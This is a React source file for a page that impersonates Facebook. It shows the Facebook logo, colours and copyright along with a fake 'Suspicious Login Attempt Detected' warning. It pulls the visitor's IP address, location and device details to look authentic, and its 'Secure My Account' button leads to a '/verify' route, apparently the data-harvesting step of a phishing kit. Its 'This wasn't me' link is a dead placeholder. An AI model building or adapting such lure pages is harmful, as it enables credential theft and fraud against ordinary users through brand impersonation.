import React from 'react';
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useIpLocation } from "@/hooks/useIpLocation";
import { getBrowserAndOS } from "@/lib/utils";
import { UserDeviceInfo } from "@/components/UserDevice";
import { AlertTriangle, ShieldAlert, Clock, Globe } from "lucide-react";

export default function WarningPage() {
  const [, setLocation] = useLocation();
  const { ip, location, loading } = useIpLocation();
  const deviceInfo = getBrowserAndOS();
  
  // Get date for login attempt
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('en-US', {
    weekday: 'long',
    year: 'numeric',
    month: 'long',
    day: 'numeric'
  });
  const formattedTime = currentDate.toLocaleTimeString('en-US', {
    hour: '2-digit',
    minute: '2-digit'
  });

  const handleContinue = () => {
    setLocation("/verify");
  };

  return (
    <>
      <Card className="w-full max-w-md bg-white rounded-lg shadow-md">
        <CardContent className="p-6">
          <div className="flex justify-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-12"
            />
          </div>
          
          <div className="text-center mb-6">
            <div className="flex justify-center mb-4">
              <span className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                <AlertTriangle className="text-[#FA383E] h-8 w-8" />
              </span>
            </div>
            <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Suspicious Login Attempt Detected</h1>
            <p className="text-gray-600 mb-4">We've noticed a login to your account from an unrecognized device or location. To protect your account, we need to verify your identity.</p>
          </div>
          
          <div className="bg-blue-50 p-4 rounded-lg mb-6">
            <div className="flex items-center mb-2">
              <ShieldAlert className="text-facebook-blue h-5 w-5 mr-2" />
              <h3 className="font-semibold text-[#1C1E21]">Why are we asking?</h3>
            </div>
            <p className="text-sm text-gray-600 ml-7 mb-2">
              We take the security of your account seriously. Unusual login activity can sometimes indicate that someone else is trying to access your account.
            </p>
          </div>
          
          <div className="bg-gray-50 p-4 rounded-lg mb-6">
            <div className="flex items-center mb-3">
              <Clock className="text-gray-500 h-5 w-5 mr-2" />
              <span className="text-sm font-medium">Login Attempt:</span>
              <span className="text-sm ml-2">{formattedDate} at {formattedTime}</span>
            </div>
            
            <div className="flex items-center mb-3">
              <Globe className="text-gray-500 h-5 w-5 mr-2" />
              <span className="text-sm font-medium">Login Method:</span>
              <span className="text-sm ml-2">Web Browser</span>
            </div>
            
            {loading ? (
              <div className="flex justify-center py-4">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-facebook-blue"></div>
              </div>
            ) : (
              <UserDeviceInfo 
                ipAddress={ip} 
                location={location} 
                device={deviceInfo} 
              />
            )}
          </div>
          
          <p className="text-sm text-gray-600 mb-4">
            To continue to your account, we'll need to verify your identity. This helps us ensure that you, and only you, have access to your Facebook account.
          </p>
          
          <Button 
            className="w-full bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-6"
            onClick={handleContinue}
          >
            Secure My Account
          </Button>
          
          <div className="mt-4 text-center">
            <a href="#" className="text-[#1877F2] text-sm hover:underline">This wasn't me</a>
            <span className="mx-2 text-gray-400">•</span>
            <a href="#" className="text-[#1877F2] text-sm hover:underline">Learn more about account security</a>
          </div>
        </CardContent>
      </Card>

      <div className="w-full max-w-md text-center mt-4 text-gray-500 text-xs">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
        <p className="mt-1">© Facebook 2023</p>
      </div>
    </>
  );
}
